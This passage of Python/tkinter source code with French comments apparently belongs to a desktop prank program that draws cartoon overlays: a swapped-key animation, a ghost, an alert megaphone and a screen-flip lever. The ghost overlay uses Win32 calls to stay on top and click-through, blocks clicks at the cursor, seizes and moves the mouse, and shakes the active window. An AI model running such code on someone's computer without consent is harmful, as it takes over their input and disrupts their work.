            self.canvas.create_line(pts[i][0], pts[i][1], pts[i+1][0], pts[i+1][1], fill="#94a3b8", width=3)
            
        # Tige en croix Cherry MX
        stem_color = "#3b82f6" if is_user_key else "#ef4444"
        self.canvas.create_rectangle(kx - 4, actual_y + 6, kx + 4, actual_y + 16, fill=stem_color, outline="#1e293b", width=1)
        self.canvas.create_rectangle(kx - 10, actual_y + 9, kx + 10, actual_y + 13, fill=stem_color, outline="")
        
        # Keycap PBT 3D
        kw, kh = 84, 54
        if is_user_key:
            col_top = "#334155"
            col_front = "#1e293b"
            col_edge = "#475569"
            col_text = "#f8fafc"
        else:
            col_top = "#f59e0b"
            col_front = "#b45309"
            col_edge = "#fbbf24"
            col_text = "#ffffff"
            
        # Face avant (ombre)
        front_pts = [
            (kx - kw//2, actual_y - kh//2 + 10),
            (kx + kw//2, actual_y - kh//2 + 10),
            (kx + kw//2 - 6, actual_y + kh//2),
            (kx - kw//2 + 6, actual_y + kh//2)
        ]
        self.canvas.create_polygon(front_pts, fill=col_front, outline="#0f172a", width=2)
        
        # Face supérieure concave
        top_pts = [
            (kx - kw//2 + 6, actual_y - kh//2),
            (kx + kw//2 - 6, actual_y - kh//2),
            (kx + kw//2 - 2, actual_y - kh//2 + 18),
            (kx - kw//2 + 2, actual_y - kh//2 + 18)
        ]
        self.canvas.create_polygon(top_pts, fill=col_top, outline=col_edge, width=2)
        self.canvas.create_line(kx - kw//2 + 12, actual_y - kh//2 + 4, kx + kw//2 - 12, actual_y - kh//2 + 4, fill="#ffffff", width=2)
        
        # Lettre gravée
        self.canvas.create_text(kx, actual_y - 2, text=char, font=("Impact", 24, "bold"), fill=col_text)
        
        # Étiquette
        lbl_y = ky - 48
        lbl_col = "#38bdf8" if is_user_key else "#f59e0b"
        self.canvas.create_rectangle(kx - 68, lbl_y - 12, kx + 68, lbl_y + 12, fill="#0f172a", outline=lbl_col, width=2)
        self.canvas.create_text(kx, lbl_y, text=label_text, font=("Impact", 10, "bold"), fill=lbl_col)
        
        if is_user_key and recoil > 6:
            self.canvas.create_text(kx + 38, actual_y - 30, text="❓", font=("Segoe UI Emoji", 18))

    def _draw(self):
        self.canvas.delete("all")
        
        key1_x = 135
        key2_x = 345
        keys_y = 190
        
        self._draw_mechanical_key(
            key1_x, keys_y, self.user_char,
            f"VOUS : '{self.user_char}'", True,
            self.user_key_depth, self.user_key_recoil
        )
        self._draw_mechanical_key(
            key2_x, keys_y, self.prank_char,
            f"FARCEUR : '{self.prank_char}'", False,
            self.prank_key_depth, 0.0
        )
        
        for sw in self.shockwaves:
            r = sw["r"]
            self.canvas.create_oval(key2_x - r, keys_y + 8 - r*0.4, key2_x + r, keys_y + 8 + r*0.4, outline="#facc15", width=3)
            
        for sp in self.sparks:
            self.canvas.create_text(sp["x"], sp["y"], text="⚡", font=("Segoe UI Emoji", 11))
            
        # Gremlin Farceur
        gx = 340 + math.sin(self.phase * 2.0) * 3.0
        gy = 75
        
        self.canvas.create_polygon([(gx - 30, gy - 16), (gx - 65, gy - 38), (gx - 18, gy - 2)], fill="#a855f7", outline="#581c87", width=2)
        self.canvas.create_polygon([(gx - 28, gy - 14), (gx - 55, gy - 32), (gx - 20, gy - 4)], fill="#f472b6", outline="")
        self.canvas.create_polygon([(gx + 30, gy - 16), (gx + 65, gy - 38), (gx + 18, gy - 2)], fill="#a855f7", outline="#581c87", width=2)
        self.canvas.create_polygon([(gx + 28, gy - 14), (gx + 55, gy - 32), (gx + 20, gy - 4)], fill="#f472b6", outline="")
        
        self.canvas.create_oval(gx - 32, gy - 28, gx + 32, gy + 28, fill="#9333ea", outline="#581c87", width=3)
        self.canvas.create_polygon([(gx - 8, gy - 28), (gx, gy - 42), (gx + 8, gy - 28)], fill="#a855f7", outline="#581c87", width=2)
        
        self.canvas.create_oval(gx - 22, gy - 14, gx - 6, gy + 4, fill="#facc15", outline="#713f12", width=2)
        self.canvas.create_oval(gx + 6, gy - 14, gx + 22, gy + 4, fill="#facc15", outline="#713f12", width=2)
        self.canvas.create_line(gx - 14, gy - 12, gx - 14, gy + 2, fill="#0f172a", width=3)
        self.canvas.create_line(gx + 14, gy - 12, gx + 14, gy + 2, fill="#0f172a", width=3)
        
        self.canvas.create_arc(gx - 20, gy - 2, gx + 20, gy + 22, start=180, extent=180, fill="#450a0a", outline="#0f172a", width=2)
        self.canvas.create_polygon([(gx - 12, gy + 10), (gx - 8, gy + 18), (gx - 4, gy + 10)], fill="#ffffff", outline="")
        self.canvas.create_polygon([(gx + 4, gy + 10), (gx + 8, gy + 18), (gx + 12, gy + 10)], fill="#ffffff", outline="")
        
        # Maillet
        if self.is_animating:
            t = self.anim_t
            if t < 0.20:
                mallet_angle = -45.0
            elif t < 0.38:
                mallet_angle = 65.0
            else:
                mallet_angle = 15.0
        else:
            mallet_angle = -15.0 + math.sin(self.phase * 3.0) * 8.0
            
        mrad = math.radians(mallet_angle)
        hand_x = gx - 20
        hand_y = gy + 18
        
        m_len = 75.0
        head_x = hand_x + math.cos(mrad) * m_len
        head_y = hand_y + math.sin(mrad) * m_len
        self.canvas.create_line(hand_x, hand_y, head_x, head_y, fill="#b45309", width=6, capstyle=tk.ROUND)
        
        head_rad = mrad + math.pi/2
        hw = 22
        c1x = head_x - math.cos(head_rad) * hw
        c1y = head_y - math.sin(head_rad) * hw
        c2x = head_x + math.cos(head_rad) * hw
        c2y = head_y + math.sin(head_rad) * hw
        self.canvas.create_line(c1x, c1y, c2x, c2y, fill="#78350f", width=24, capstyle=tk.ROUND)
        self.canvas.create_line(c1x, c1y, c1x + math.cos(mrad)*4, c1y + math.sin(mrad)*4, fill="#94a3b8", width=22)
        self.canvas.create_line(c2x, c2y, c2x - math.cos(mrad)*4, c2y - math.sin(mrad)*4, fill="#94a3b8", width=22)
        self.canvas.create_oval(hand_x - 7, hand_y - 7, hand_x + 7, hand_y + 7, fill="#7e22ce", outline="#0f172a", width=2)
        
        if self.bubble_timer > 0:
            bx = 240
            by = 40
            self.canvas.create_rectangle(bx - 120, by - 16, bx + 120, by + 16, fill="#fef08a", outline="#ca8a04", width=2)
            self.canvas.create_text(bx, by, text=self.bubble_text, font=("Impact", 12, "bold"), fill="#dc2626")


class CartoonGhostOverlay:
    """
    Poltergeist cartoon hyper interactif et BEAUCOUP PLUS CHIANT :
    1. Traque activement le curseur et se place DIRECTEMENT devant la souris pour bloquer les clics !
    2. Projette des flaques de bave d'ectoplasme gluantes directement sous le curseur.
    3. Fait des jumpscares agressifs rapprochés (zoom 2.4x) avec secousses d'écran et cri de frayeur.
    4. Kidnappe parfois la souris pour la faire tourner en rond.
    5. Feux follets taquins et bulles de dialogues provocatrices !
    """
    def __init__(self, master):
        self.master = master
        self.win = tk.Toplevel(master)
        self.win.overrideredirect(True)
        self.win.attributes("-topmost", True)
        self.win.attributes("-transparentcolor", "#010101")
        self.win.configure(bg="#010101")
        self.win.withdraw()
        
        self.sw = self.win.winfo_screenwidth()
        self.sh = self.win.winfo_screenheight()
        self.w, self.h = self.sw, self.sh
        self.win.geometry(f"{self.w}x{self.h}+0+0")
        
        self.canvas = tk.Canvas(self.win, width=self.w, height=self.h, bg="#010101", highlightthickness=0)
        self.canvas.pack(fill="both", expand=True)
        
        try:
            self.win.update_idletasks()
            self.hwnd = ctypes.windll.user32.GetParent(self.win.winfo_id()) or self.win.winfo_id()
            ex = ctypes.windll.user32.GetWindowLongW(self.hwnd, -20)
            ctypes.windll.user32.SetWindowLongW(
                self.hwnd, -20,
                ex | 0x00080000 | 0x00000020 | 0x00000080 | 0x08000000
            )
        except Exception:
            self.hwnd = None
            
        self.gx = float(self.sw // 2)
        self.gy = float(self.sh // 3)
        self.phase = 0.0
        self.visible = False
        self._loop_active = True
        
        self.state = "BLOCK_MOUSE"
        self.state_timer = 0
        self.jumpscare_scale = 1.0
        
        self.last_mx = self.sw // 2
        self.last_my = self.sh // 2
        self.mouse_idle_frames = 0
        
        self.ectoplasm = []
        self.sound_waves = []
        self.wisps = [
            {"angle": 0.0, "dist": 50, "speed": 0.08},
            {"angle": 2.1, "dist": 70, "speed": -0.06},
            {"angle": 4.2, "dist": 60, "speed": 0.07}
        ]
        self.taunt_text = "T'ESSAIES DE CLIQUER OÙ ? 😜"
        self.taunt_timer = 60
        
        self._tick()

    def trigger_booh(self):
        """Déclenche un jumpscare instantané avec répulsion de souris."""
        self.state = "JUMPSCARE"
        self.state_timer = 0
        self.jumpscare_scale = 2.4
        self.taunt_text = random.choice([
            "BOOOOUH ! 👻⚡", "ATTRAPÉ ! 😂",
            "T'AS CRU POUVOIR CLIQUER ? 😜", "DÉGAGE DE LÀ ! 💥"
        ])
        self.taunt_timer = 40
        self.sound_waves.append({"r": 20, "max_r": 160, "life": 1.0})

    def _tick(self):
        if not self._loop_active:
            return
        try:
            global ghost_state
            if ghost_state.get("active", False):
                if not self.visible:
                    self.visible = True
                    self.win.deiconify()
                    self.win.lift()
                    
                pt = wintypes.POINT()
                ctypes.windll.user32.GetCursorPos(ctypes.byref(pt))
                mx, my = pt.x, pt.y
                
                if abs(mx - self.last_mx) < 3 and abs(my - self.last_my) < 3:
                    self.mouse_idle_frames += 1
                else:
                    self.mouse_idle_frames = 0
                self.last_mx, self.last_my = mx, my
                
                self.phase += 0.12
                self.state_timer += 1
                
                for w in self.wisps:
                    w["angle"] += w["speed"]
                    
                # 1. État BLOCK_MOUSE : Le fantôme se place systèmatiquement DIRECTEMENT DEVANT le curseur
                if self.state == "BLOCK_MOUSE":
                    target_gx = mx + 20
                    target_gy = my - 15
                    
                    dx = target_gx - self.gx
                    dy = target_gy - self.gy
                    self.gx += dx * 0.28
                    self.gy += dy * 0.28
                    
                    self.gx += math.sin(self.phase * 2.0) * 4.0
                    self.gy += math.cos(self.phase * 2.5) * 4.0
                    
                    if self.mouse_idle_frames > 35 and self.state_timer > 60:
                        self.trigger_booh()
                    elif self.state_timer % 90 == 0:
                        self.state = "SLIME_ATTACK"
                        self.state_timer = 0
                    elif self.state_timer > 240 and random.random() < 0.3:
                        self.state = "KIDNAP"
                        self.state_timer = 0
                        
                # 2. État SLIME_ATTACK : Crache de la bave d'ectoplasme gluante sur le curseur
                elif self.state == "SLIME_ATTACK":
                    if len(self.ectoplasm) < 14:
                        self.ectoplasm.append({
                            "x": mx,
                            "y": my,
                            "r": random.uniform(22, 38),
                            "drip": 0.0,
                            "max_drip": random.uniform(40, 160),
                            "life": random.uniform(10.0, 18.0)
                        })
                    self.taunt_text = "SPLURP ! UN PEU DE BAVE ? 🧪"
                    self.taunt_timer = 35
                    self.state = "BLOCK_MOUSE"
                    self.state_timer = 0
                    
                # 3. État KIDNAP : Attrape le curseur et le fait tourner en spirale
                elif self.state == "KIDNAP":
                    spiral_r = 50.0 + math.sin(self.state_timer * 0.3) * 30.0
                    k_angle = self.state_timer * 0.25
                    new_cur_x = int(self.gx + math.cos(k_angle) * spiral_r)
                    new_cur_y = int(self.gy + math.sin(k_angle) * spiral_r)
                    try:
                        ctypes.windll.user32.SetCursorPos(new_cur_x, new_cur_y)
                    except Exception:
                        pass
                    self.taunt_text = "C'EST MON CURSEUR ! 🖱️👻"
                    self.taunt_timer = 30
                    if self.state_timer > 50:
                        self.state = "BLOCK_MOUSE"
                        self.state_timer = 0
                        
                # 4. État JUMPSCARE : Grossit subitement, hurle, repousse la souris et secoue la fenêtre
                elif self.state == "JUMPSCARE":
                    self.jumpscare_scale = max(1.0, self.jumpscare_scale - 0.06)
                    if self.state_timer == 1:
                        repel_dist = random.uniform(180, 260)
                        repel_ang = random.uniform(0, 2 * math.pi)
                        nx = int(max(40, min(self.sw - 40, mx + math.cos(repel_ang) * repel_dist)))
                        ny = int(max(40, min(self.sh - 40, my + math.sin(repel_ang) * repel_dist)))
                        try:
                            ctypes.windll.user32.SetCursorPos(nx, ny)
                        except Exception:
                            pass
                        try:
                            fg_hwnd = ctypes.windll.user32.GetForegroundWindow()
                            if fg_hwnd:
                                rect = wintypes.RECT()
                                ctypes.windll.user32.GetWindowRect(fg_hwnd, ctypes.byref(rect))
                                threading.Thread(target=_shake_window_briefly, args=(fg_hwnd, rect.left, rect.top), daemon=True).start()
                        except Exception:
                            pass
                    if self.state_timer > 30:
                        self.state = "BLOCK_MOUSE"
                        self.state_timer = 0
                        self.jumpscare_scale = 1.0
                        
                new_waves = []
                for w in self.sound_waves:
                    w["r"] += 5.5
                    w["life"] -= 0.04
                    if w["life"] > 0 and w["r"] < w["max_r"]:
                        new_waves.append(w)
                self.sound_waves = new_waves
                
                new_ecto = []
                for e in self.ectoplasm:
                    if e["drip"] < e["max_drip"]:
                        e["drip"] += 1.2
                    e["life"] -= 0.02
                    if e["life"] > 0:
                        new_ecto.append(e)
                self.ectoplasm = new_ecto
                
                if self.taunt_timer > 0:
                    self.taunt_timer -= 1
                    
                self._draw(mx, my)
            else:
                if self.visible:
                    self.visible = False
                    self.win.withdraw()
                    self.ectoplasm.clear()
                    self.sound_waves.clear()
        except Exception:
            pass
        if self.master:
            self.master.after(20, self._tick)

    def _draw(self, mx, my):
        self.canvas.delete("all")
        
        # 1. Flaques d'ectoplasme gluantes dégoulinantes
        for e in self.ectoplasm:
            ex, ey, er, edrip = e["x"], e["y"], e["r"], e["drip"]
            self.canvas.create_oval(ex - er, ey - er*0.6, ex + er, ey + er*0.6, fill="#22c55e", outline="#15803d", width=2)
            self.canvas.create_oval(ex - er*0.5, ey - er*0.35, ex + er*0.3, ey, fill="#86efac", outline="")
            if edrip > 2:
                self.canvas.create_line(ex, ey, ex, ey + edrip, fill="#22c55e", width=5, capstyle=tk.ROUND)
                self.canvas.create_oval(ex - 4, ey + edrip - 4, ex + 4, ey + edrip + 6, fill="#16a34a", outline="")
                
        # 2. Feux follets / mini-esprits qui gravitent autour
        for w in self.wisps:
            wx = self.gx + math.cos(w["angle"]) * w["dist"]
            wy = self.gy + math.sin(w["angle"]) * (w["dist"] * 0.6)
            self.canvas.create_oval(wx - 8, wy - 8, wx + 8, wy + 8, fill="#38bdf8", outline="#e0f2fe", width=1)
            self.canvas.create_oval(wx - 4, wy - 4, wx + 4, wy + 4, fill="#ffffff", outline="")
            
        # 3. Ondes sonores de cri spectral
        for w in self.sound_waves:
            r = w["r"]
            self.canvas.create_oval(self.gx - r, self.gy - r, self.gx + r, self.gy + r, outline="#38bdf8", width=3, dash=(6, 3))
            
        # 4. Dessin du fantôme
        scale = self.jumpscare_scale
        cx, cy = self.gx, self.gy
        
        for aura_r in [65 * scale, 50 * scale, 38 * scale]:
            self.canvas.create_oval(cx - aura_r, cy - aura_r, cx + aura_r, cy + aura_r, fill="", outline="#38bdf8", width=2)
            
        bw = 44 * scale
        pts = []
        for deg in range(0, 185, 15):
            rad = math.radians(deg)
            pts.append((cx + math.cos(rad) * bw, cy - 20 * scale - math.sin(rad) * 42 * scale))
        skirt_y = cy + 38 * scale
        vol_count = 6
        for v in range(vol_count + 1):
            vx = cx - bw + (v * (bw * 2 / float(vol_count)))
            wave = math.sin(self.phase * 4.0 + v * 1.5) * (14 * scale)
            pts.append((vx, skirt_y + wave))
            
        self.canvas.create_polygon(pts, fill="#f8fafc", outline="#0f172a", width=3, smooth=True)
        self.canvas.create_arc(cx - bw + 8, cy - 50 * scale, cx + bw - 8, cy + 10, start=60, extent=60, style="arc", outline="#bae6fd", width=3)
        
        eye_y = cy - 22 * scale
        if self.state == "JUMPSCARE":
            self.canvas.create_oval(cx - 24*scale, eye_y - 14*scale, cx - 6*scale, eye_y + 12*scale, fill="#dc2626", outline="#7f1d1d", width=2)
            self.canvas.create_oval(cx + 6*scale, eye_y - 14*scale, cx + 24*scale, eye_y + 12*scale, fill="#dc2626", outline="#7f1d1d", width=2)
            self.canvas.create_oval(cx - 18*scale, eye_y - 8*scale, cx - 12*scale, eye_y + 2*scale, fill="#fef08a", outline="")
            self.canvas.create_oval(cx + 12*scale, eye_y - 8*scale, cx + 18*scale, eye_y + 2*scale, fill="#fef08a", outline="")
            self.canvas.create_oval(cx - 22*scale, cy + 6*scale, cx + 22*scale, cy + 34*scale, fill="#0f172a", outline="#94a3b8", width=2)
            self.canvas.create_polygon([(cx - 14*scale, cy + 6*scale), (cx - 9*scale, cy + 16*scale), (cx - 4*scale, cy + 6*scale)], fill="#ffffff", outline="")
            self.canvas.create_polygon([(cx + 4*scale, cy + 6*scale), (cx + 9*scale, cy + 16*scale), (cx + 14*scale, cy + 6*scale)], fill="#ffffff", outline="")
        else:
            self.canvas.create_oval(cx - 20*scale, eye_y - 10*scale, cx - 4*scale, eye_y + 8*scale, fill="#0f172a", outline="")
            self.canvas.create_oval(cx + 4*scale, eye_y - 10*scale, cx + 20*scale, eye_y + 8*scale, fill="#0f172a", outline="")
            self.canvas.create_oval(cx - 15*scale, eye_y - 8*scale, cx - 9*scale, eye_y - 2*scale, fill="#ffffff", outline="")
            self.canvas.create_oval(cx + 9*scale, eye_y - 8*scale, cx + 15*scale, eye_y - 2*scale, fill="#ffffff", outline="")
            self.canvas.create_arc(cx - 18*scale, cy + 2*scale, cx + 18*scale, cy + 22*scale, start=180, extent=180, fill="#0f172a", outline="", width=2)
            tongue_w = math.sin(self.phase * 5.0) * (6 * scale)
            self.canvas.create_oval(cx - 8*scale + tongue_w, cy + 12*scale, cx + 8*scale + tongue_w, cy + 28*scale, fill="#f43f5e", outline="#9f1239", width=1)
            
        hx1 = cx - 35 * scale + math.sin(self.phase * 3.0) * 8
        hy1 = cy + 10 * scale
        hx2 = cx + 35 * scale - math.sin(self.phase * 3.0) * 8
        hy2 = cy + 10 * scale
        self.canvas.create_oval(hx1 - 10*scale, hy1 - 8*scale, hx1 + 10*scale, hy1 + 8*scale, fill="#f8fafc", outline="#0f172a", width=2)
        self.canvas.create_oval(hx2 - 10*scale, hy2 - 8*scale, hx2 + 10*scale, hy2 + 8*scale, fill="#f8fafc", outline="#0f172a", width=2)
        
        if self.taunt_timer > 0:
            tx = cx
            ty = cy - 75 * scale
            self.canvas.create_rectangle(tx - 110, ty - 16, tx + 110, ty + 16, fill="#fef08a", outline="#ca8a04", width=2)
            self.canvas.create_text(tx, ty, text=self.taunt_text, font=("Impact", int(12 * scale), "bold"), fill="#dc2626")

class CartoonMegaphoneOverlay:
    """
    Mégaphone d'alerte cartoon vivant :
    Cône de porte-voix en émail rouge et blanc à cerclage chromé, tenu par des gants
    de cartoon blancs à quatre doigts (style Mickey), gyrophare de police rotatif balayant
    l'écran de faisceaux lumineux, ondes acoustiques et banderole 'ALERTE SYSTÈME ! ⚠️📢'.
    """
    def __init__(self, master):
        self.master = master
        self.win = tk.Toplevel(master)
        self.win.overrideredirect(True)
        self.win.attributes("-topmost", True)
        self.win.attributes("-transparentcolor", "#010101")
        self.win.configure(bg="#010101")
        self.win.withdraw()
        
        self.w, self.h = 280, 240
        self.canvas = tk.Canvas(self.win, width=self.w, height=self.h, bg="#010101", highlightthickness=0)
        self.canvas.pack(fill="both", expand=True)
        
        try:
            self.win.update_idletasks()
            self.hwnd = ctypes.windll.user32.GetParent(self.win.winfo_id()) or self.win.winfo_id()
            ex = ctypes.windll.user32.GetWindowLongW(self.hwnd, -20)
            ctypes.windll.user32.SetWindowLongW(
                self.hwnd, -20,
                ex | 0x00080000 | 0x00000020 | 0x00000080 | 0x08000000
            )
        except Exception:
            self.hwnd = None
            
        self.phase = 0.0
        self.sound_waves = []
        self.visible = False
        self._loop_active = True
        self._tick()
        
    def _tick(self):
        if not self._loop_active:
            return
        try:
            global tts_state
            if tts_state.get("active", False):
                if not self.visible:
                    self.visible = True
                    self.win.deiconify()
                    self.win.lift()
                    sw = self.win.winfo_screenwidth()
                    self.win.geometry(f"{self.w}x{self.h}+{sw - self.w - 30}+40")
                    
                self.phase += 0.2
                if len(self.sound_waves) < 5:
                    self.sound_waves.append({"r": 10.0, "life": 1.0})
                    
                new_waves = []
                for w in self.sound_waves:
                    w["r"] += 4.0
                    w["life"] -= 0.05
                    if w["life"] > 0 and w["r"] < 100:
                        new_waves.append(w)
                self.sound_waves = new_waves
                
                self._draw()
            else:
                if self.visible:
                    self.visible = False
                    self.win.withdraw()
                    self.sound_waves.clear()
        except Exception:
            pass
        if self.master:
            self.master.after(20, self._tick)
            
    def _draw(self):
        self.canvas.delete("all")
        cx = 100
        cy = 135
        
        # 1. Faisceaux lumineux du gyrophare de police
        siren_x = cx + 25
        siren_y = cy - 58
        beacon_rot = self.phase * 3.5
        for b_side, b_color in [(-1, "#ef4444"), (1, "#3b82f6")]:
            b_ang = beacon_rot + b_side * (math.pi / 2.0)
            bx = siren_x + math.cos(b_ang) * 90
            by = siren_y + math.sin(b_ang) * 45
            self.canvas.create_polygon([(siren_x, siren_y), (bx - 25, by), (bx + 25, by)], fill=b_color, outline="")
            
        # 2. Boîtier du gyrophare
        self.canvas.create_rectangle(siren_x - 14, siren_y - 2, siren_x + 14, siren_y + 12, fill="#334155", outline="#0f172a", width=2)
        siren_dome_color = "#ef4444" if math.sin(self.phase * 4.0) > 0 else "#3b82f6"
        self.canvas.create_arc(siren_x - 16, siren_y - 20, siren_x + 16, siren_y + 6, start=0, extent=180, fill=siren_dome_color, outline="#0f172a", width=2)
        
        # 3. Ondes sonores puissantes expulsées du pavillon
        for w in self.sound_waves:
            wr = w["r"]
            self.canvas.create_arc(cx + 50 - wr, cy - wr, cx + 50 + wr, cy + wr, start=-50, extent=100, style="arc", outline="#f59e0b", width=3)
            
        # 4. Pavillon évasé du mégaphone cartoon
        horn_pts = [
            (cx - 45, cy - 18),
            (cx + 45, cy - 48),
            (cx + 45, cy + 48),
            (cx - 45, cy + 18)
        ]
        self.canvas.create_polygon(horn_pts, fill="#dc2626", outline="#0f172a", width=3)
        # Anneau chromé brillant sur le pavillon
        self.canvas.create_oval(cx + 36, cy - 48, cx + 54, cy + 48, fill="#e2e8f0", outline="#0f172a", width=3)
        self.canvas.create_oval(cx + 40, cy - 40, cx + 50, cy + 40, fill="#0f172a", outline="")
        
        # Poignée et bouton poussoir
        self.canvas.create_rectangle(cx - 30, cy + 18, cx - 18, cy + 55, fill="#475569", outline="#0f172a", width=2)
        self.canvas.create_oval(cx - 20, cy + 24, cx - 10, cy + 34, fill="#ef4444", outline="#0f172a", width=2) # gâchette
        
        # 5. Gants cartoon blancs (style Mickey) tenant le mégaphone
        self.canvas.create_oval(cx - 38, cy + 32, cx - 12, cy + 58, fill="#ffffff", outline="#0f172a", width=3)
        # Trois traits de couture noirs sur le dos du gant
        self.canvas.create_line(cx - 30, cy + 40, cx - 30, cy + 50, fill="#0f172a", width=2)
        self.canvas.create_line(cx - 25, cy + 38, cx - 25, cy + 52, fill="#0f172a", width=2)
        self.canvas.create_line(cx - 20, cy + 40, cx - 20, cy + 50, fill="#0f172a", width=2)
        
        # 6. Banderole et texte d'alerte
        self.canvas.create_text(cx + 45, cy - 75, text="ALERTE SYSTÈME ! ⚠️📢", font=("Impact", 13, "bold"), fill="#facc15")

class CartoonRotateOverlay:
    """
    Console de commande industrielle diesel-punk cartoon :
    Plaque d'acier à rayures de danger jaunes et noires, engrenages dorés à cames rotatives,
    levier industriel à boule rouge vigoureusement tiré par un ouvrier en salopette bleue
    et casque de chantier qui transpire à grosses gouttes, avec banderole 'BASCULE 180° ! 🔄'.
    """
    def __init__(self, master):
        self.master = master
        self.win = tk.Toplevel(master)
        self.win.overrideredirect(True)
        self.win.attributes("-topmost", True)
        self.win.attributes("-transparentcolor", "#010101")
        self.win.configure(bg="#010101")
        self.win.withdraw()
        
        self.w, self.h = 320, 260
        self.canvas = tk.Canvas(self.win, width=self.w, height=self.h, bg="#010101", highlightthickness=0)
        self.canvas.pack(fill="both", expand=True)
        
        try:
            self.win.update_idletasks()
            self.hwnd = ctypes.windll.user32.GetParent(self.win.winfo_id()) or self.win.winfo_id()
            ex = ctypes.windll.user32.GetWindowLongW(self.hwnd, -20)
            ctypes.windll.user32.SetWindowLongW(
                self.hwnd, -20,
                ex | 0x00080000 | 0x00000020 | 0x00000080 | 0x08000000
            )
        except Exception:
            self.hwnd = None
            
        self.phase = 0.0
        self.lever_angle = 0.0
        self.visible = False
        self._loop_active = True
        self._tick()
        
    def _tick(self):
        if not self._loop_active:
            return
        try:
            global rotate_state
            if rotate_state.get("active", False):
                if not self.visible:
                    self.visible = True
                    self.win.deiconify()
                    self.win.lift()
                    sw = self.win.winfo_screenwidth()
                    self.win.geometry(f"{self.w}x{self.h}+{sw - self.w - 20}+30")
                    
                self.phase += 0.22
                self.lever_angle = math.sin(self.phase) * 38.0
                self._draw()
            else:
                if self.visible:
                    self.visible = False
                    self.win.withdraw()
        except Exception:
            pass
        if self.master:
            self.master.after(20, self._tick)
            
    def _draw(self):
        self.canvas.delete("all")
        cx = 120
        cy = 160
        
        # 1. Base industrielle avec bandes diagonales d'avertissement jaune & noir
        base_w, base_h = 130, 65
        self.canvas.create_rectangle(cx - base_w//2, cy + 15, cx + base_w//2, cy + 15 + base_h, fill="#1e293b", outline="#0f172a", width=3)
        for h in range(-50, 60, 20):
            self.canvas.create_polygon([
                (cx + h, cy + 17),
                (cx + h + 12, cy + 17),
                (cx + h - 4, cy + 13 + base_h),
                (cx + h - 16, cy + 13 + base_h)
            ], fill="#facc15", outline="")
            
        self.canvas.create_rectangle(cx - 38, cy + 32, cx + 38, cy + 62, fill="#0f172a", outline="#334155", width=2)
        self.canvas.create_text(cx, cy + 47, text="180° FLIP", font=("Impact", 11, "bold"), fill="#ef4444")
        
        # 2. Engrenages dorés mécaniques à cames
        gear_rot = self.phase * 3.0
        gx, gy = cx - 55, cy + 8
        self.canvas.create_oval(gx - 24, gy - 24, gx + 24, gy + 24, fill="#d97706", outline="#78350f", width=2)
        for g in range(6):
            ga = gear_rot + g * (math.pi / 3.0)
            self.canvas.create_line(gx, gy, gx + math.cos(ga) * 28, gy + math.sin(ga) * 28, fill="#78350f", width=6)
        self.canvas.create_oval(gx - 10, gy - 10, gx + 10, gy + 10, fill="#fef3c7", outline="#78350f", width=2)
        
        # 3. Levier mécanique géant
        rad = math.radians(self.lever_angle - 45)
        lx = cx + math.cos(rad) * 75
        ly = cy + 15 + math.sin(rad) * 75
        self.canvas.create_line(cx, cy + 20, lx, ly, fill="#94a3b8", width=10, capstyle=tk.ROUND)
        self.canvas.create_oval(lx - 15, ly - 15, lx + 15, ly + 15, fill="#dc2626", outline="#7f1d1d", width=3)
        self.canvas.create_oval(lx - 8, ly - 10, lx, ly - 4, fill="#f87171", outline="") # reflet boule
        
        # 4. Ouvrier cartoon s'agrippant au levier
        char_x = lx + 36
        char_y = cy - 15
        
        # Salopette en jean bleu de travail
        self.canvas.create_oval(char_x - 24, char_y - 35, char_x + 24, char_y + 25, fill="#2563eb", outline="#1e3a8a", width=3)
        self.canvas.create_line(char_x - 14, char_y - 30, char_x - 8, char_y + 5, fill="#ca8a04", width=3) # bretelle
        self.canvas.create_line(char_x + 14, char_y - 30, char_x + 8, char_y + 5, fill="#ca8a04", width=3) # bretelle
        
        # Tête et casque de chantier jaune avec lampe
        self.canvas.create_oval(char_x - 22, char_y - 55, char_x + 22, char_y - 25, fill="#fed7aa", outline="#c2410c", width=2)
        self.canvas.create_arc(char_x - 28, char_y - 70, char_x + 28, char_y - 35, start=0, extent=180, fill="#facc15", outline="#854d0e", width=3)
        self.canvas.create_oval(char_x - 7, char_y - 68, char_x + 7, char_y - 54, fill="#ffffff", outline="#ca8a04", width=2) # phare
        
        # Yeux concentrés et dents serrées
        self.canvas.create_line(char_x - 14, char_y - 42, char_x - 4, char_y - 38, fill="#0f172a", width=3)
        self.canvas.create_line(char_x + 4, char_y - 38, char_x + 14, char_y - 42, fill="#0f172a", width=3)
        self.canvas.create_rectangle(char_x - 10, char_y - 32, char_x + 10, char_y - 24, fill="#ffffff", outline="#0f172a", width=2)
        
        # Bras tirant le levier avec gant blanc
        self.canvas.create_line(char_x - 12, char_y - 15, lx, ly, fill="#fed7aa", width=9, capstyle=tk.ROUND)
        self.canvas.create_oval(lx - 10, ly - 10, lx + 10, ly + 10, fill="#f8fafc", outline="#0f172a", width=2)
        
        # Sueur giclant
        self.canvas.create_text(char_x + 26, char_y - 48, text="💦", font=("Segoe UI Emoji", 15))
        
        # 5. Banderole de texte
        self.canvas.create_text(cx + 25, cy - 85, text="BASCULE 180° ! 🔄", font=("Impact", 13, "bold"), fill="#ef4444")
        self.canvas.create_text(cx + 25, cy - 65, text="GRAVITÉ RENVERSÉE ! ⚡", font=("Impact", 10, "bold"), fill="#facc15")

def ensure_prank_overlays_started():
    global puller_overlay_instance, drunk_overlay_instance, wall_overlay_instance, painter_overlay_instance
    global keys_overlay_instance, ghost_overlay_instance, tts_overlay_instance, rotate_overlay_instance, monkey_overlay_instance, root
    if root:
        try:
            def _create():
                global puller_overlay_instance, drunk_overlay_instance, wall_overlay_instance, painter_overlay_instance
                global keys_overlay_instance, ghost_overlay_instance, tts_overlay_instance, rotate_overlay_instance, monkey_overlay_instance, root
                if root:
                    if puller_overlay_instance is None:
                        puller_overlay_instance = CartoonPullerOverlay(root)
                    if drunk_overlay_instance is None:
                        drunk_overlay_instance = CartoonDrunkOverlay(root)
                    if wall_overlay_instance is None:
                        wall_overlay_instance = CartoonWallOverlay(root)
                    if painter_overlay_instance is None:
                        painter_overlay_instance = CartoonPainterOverlay(root)
                    if keys_overlay_instance is None:
                        keys_overlay_instance = CartoonKeysOverlay(root)
                    if ghost_overlay_instance is None:
                        ghost_overlay_instance = CartoonGhostOverlay(root)
                    if tts_overlay_instance is None:
                        tts_overlay_instance = CartoonMegaphoneOverlay(root)
                    if rotate_overlay_instance is None:
                        rotate_overlay_instance = CartoonRotateOverlay(root)
                    if monkey_overlay_instance is None:
                        monkey_overlay_instance = CartoonMonkeyOverlay(root)
